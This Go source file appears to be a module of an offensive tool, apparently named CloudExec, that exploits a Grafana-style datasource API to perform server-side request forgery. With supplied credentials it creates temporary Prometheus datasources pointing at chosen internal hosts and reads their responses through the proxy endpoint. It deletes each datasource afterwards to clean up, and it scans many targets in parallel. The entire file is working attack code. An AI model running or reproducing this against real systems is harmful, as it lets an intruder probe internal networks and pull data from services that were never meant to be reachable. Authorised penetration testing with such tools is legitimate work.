package modules

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/cotsom/CloudExec/internal/utils"
)

type Ssrf struct {
	ID          int            `json:"id"`
	UID         string         `json:"uid"`
	OrgID       int            `json:"orgId"`
	Name        string         `json:"name"`
	Type        string         `json:"type"`
	TypeName    string         `json:"typeName"`
	TypeLogoURL string         `json:"typeLogoUrl"`
	Access      string         `json:"access"`
	URL         string         `json:"url"`
	User        string         `json:"user"`
	Database    string         `json:"database"`
	BasicAuth   bool           `json:"basicAuth"`
	IsDefault   bool           `json:"isDefault"`
	JsonData    map[string]any `json:"jsonData"`
	ReadOnly    bool           `json:"readOnly"`
}

func (m Ssrf) RunModule(target string, flags map[string]string) {
	if flags["user"] == "" && flags["password"] == "" {
		return
	}

	defport := "3000"
	if flags["port"] != "" {
		defport = flags["port"]
	}

	if flags["timeout"] == "" {
		flags["timeout"] = "3"
	}
	timeout, _ := strconv.Atoi(flags["timeout"])

	ssrfTargets := utils.ParseTargets(flags["ssrf-target"])

	//MAIN LOGIC
	var wg sync.WaitGroup
	var sem chan struct{}

	//set threads
	threads, err := strconv.Atoi(flags["threads"])
	if err != nil {
		fmt.Println("You have to set correct number of threads")
		os.Exit(0)
	}
	sem = make(chan struct{}, threads)

	progress := 0
	for i, ssrfTarget := range ssrfTargets {
		wg.Add(1)
		sem <- struct{}{}
		go makeSsrfRequest(&wg, sem, flags, target, defport, ssrfTarget, timeout)
		utils.ProgressBar(len(ssrfTargets), i+1, &progress)
	}
	fmt.Println("")
	wg.Wait()
}

func makeSsrfRequest(wg *sync.WaitGroup, sem chan struct{}, flags map[string]string, target string, defport string, ssrfTarget string, timeout int) {
	defer func() {
		<-sem
		wg.Done()
	}()

	client := http.Client{
		Timeout: time.Duration(timeout) * time.Second,
	}

	dsID, err := createDS(flags, target, defport, client, ssrfTarget)
	if err != nil {
		utils.Colorize(utils.ColorRed, fmt.Sprintf("Can't create datasource%v", err))
		return
	}

	proxyURL := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources/proxy/%d", flags["user"], flags["password"], target, defport, dsID)
	proxyReq, err := http.NewRequest(http.MethodGet, proxyURL, nil)
	if err != nil {
		fmt.Println("err")
	}

	proxyResp, err := client.Do(proxyReq)
	if err != nil {
		fmt.Printf("Can't make proxy request: %v\n", err)
		deleteDS(flags, target, defport, client, dsID)
		return
	}

	defer proxyResp.Body.Close()

	body, _ := io.ReadAll(proxyResp.Body)
	if body != nil {
		utils.Colorize(utils.ColorYellow, fmt.Sprintf("[+] %s - %s", ssrfTarget, string(body)))
	}

	deleteDS(flags, target, defport, client, dsID)

}

func createDS(flags map[string]string, target string, port string, client http.Client, ssrfTarget string) (int, error) {
	url := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources", flags["user"], flags["password"], target, port)

	payload := map[string]any{
		"name":     utils.RandStringRunes(10),
		"type":     "prometheus",
		"access":   "proxy",
		"url":      fmt.Sprintf("http://%s:%s", ssrfTarget, flags["ssrf-port"]),
		"jsonData": map[string]any{},
	}

	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println(err)
		return 0, err
	}

	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(payloadBytes))
	if err != nil {
		fmt.Println(err)
		return 0, err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		// fmt.Println(err)
		return 0, err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		body, _ := io.ReadAll(resp.Body)
		utils.Colorize(utils.ColorRed, fmt.Sprintf("[!] %s:%s - %d %s", target, port, resp.StatusCode, string(body)))
		return 0, fmt.Errorf("")
	}

	var createResp Ssrf
	if err := json.NewDecoder(resp.Body).Decode(&createResp); err != nil {
		fmt.Printf("Can't get Datasource creation response: %v\n", err)
		return 0, err
	}
	dsID := createResp.ID

	return dsID, nil
}

func deleteDS(flags map[string]string, target string, port string, client http.Client, dsID int) {
	deleteURL := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources/%d", flags["user"], flags["password"], target, port, dsID)
	delReq, err := http.NewRequest(http.MethodDelete, deleteURL, nil)
	if err != nil {
		fmt.Println("err")
	}
	delResp, err := client.Do(delReq)
	if err != nil {
		utils.Colorize(utils.ColorRed, fmt.Sprintf("Can't delete datasource%v", err))
	}

	if delResp != nil {
		defer delResp.Body.Close()
	}
}
